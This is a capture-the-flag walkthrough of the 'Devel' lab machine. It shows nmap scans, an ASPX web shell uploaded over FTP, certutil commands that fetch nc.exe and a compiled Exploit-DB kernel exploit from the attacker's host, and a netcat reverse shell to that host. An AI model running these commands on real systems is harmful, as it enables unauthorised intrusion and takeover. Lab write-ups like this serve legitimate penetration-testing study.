**Ping**
```
ping 10.10.10.5
```
![[Pasted image 20240614195220.png]]

Nmap Initial Scan
```
nmap -p- --min-rate 10000 10.10.10.5 -oN inmap
```
![[Pasted image 20240614195451.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.5 -sCV -oN snamp
```
![[Pasted image 20240614195508.png]]

FTP Enumeration
![[Pasted image 20240614201628.png]]




Looks like as aspnet website, so will transfer our cmdasp.aspx file 
```
put cmdasp.aspx
```
![[Pasted image 20240614201722.png]]

Now will request the cmdasp.aspx
![[Pasted image 20240614201746.png]]
Coooool, we got RCE 

```
whoami
```
![[Pasted image 20240614201847.png]]

Will Get a reverse shell using this RCE
```
certutil -urlcache -f http://10.10.14.2/nc.exe c:/windows/temp/nc.exe
```
![[Pasted image 20240614202047.png]]

```
dir C:\windows\temp
```
![[Pasted image 20240614202130.png]]

We can see our nc.exe, so its time to get a reverse shell
```
C:\windows\temp\nc.exe -e cmd.exe 10.10.14.2 443
```
![[Pasted image 20240614202500.png]]

We got reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240614202555.png]]



Will see our Privileges
```
whoami /priv
```
![[Pasted image 20240614203011.png]]
Cool, we have impersonation privilege

But, after some hard tries, i can't use impersonate privilege to escalate my Privilege

Will try build Exploit for out target system
```
systeminfo
```
![[Pasted image 20240614205430.png]]
Got it I guess, Its a vulnerable build

Will find public exploit for the vulnerable build
![[Pasted image 20240614205544.png]]

We are using the Exploit-db's exploit https://www.exploit-db.com/exploits/40564
![[Pasted image 20240614205639.png]]

Will use this accordingly
```
i686-w64-mingw32-gcc exp.c -o exp.exe -lws2_32
```
![[Pasted image 20240614205712.png]]
I have saved the exploit code in file named exp.c

And I have transferred the exploit to the target machine
```
certutil -urlcache -f http://10.10.14.2:8080/exp.exe c:/users/public/exp.exe
```
![[Pasted image 20240614205846.png]]
![[Pasted image 20240614205816.png]]

![[Pasted image 20240614205928.png]]

Will run the exploit
```
exp.exe
```
![[Pasted image 20240614205958.png]]
Cooool, We are admin now...!

Found the flags location
```
dir /s /b C:\user.txt
```
```
dir /s /b C:\root.txt
```
![[Pasted image 20240614210105.png]]

Retrieved the flags
User.txt
![[Pasted image 20240614210234.png]]

root.txt
![[Pasted image 20240614210327.png]]




Done with Devel…..:)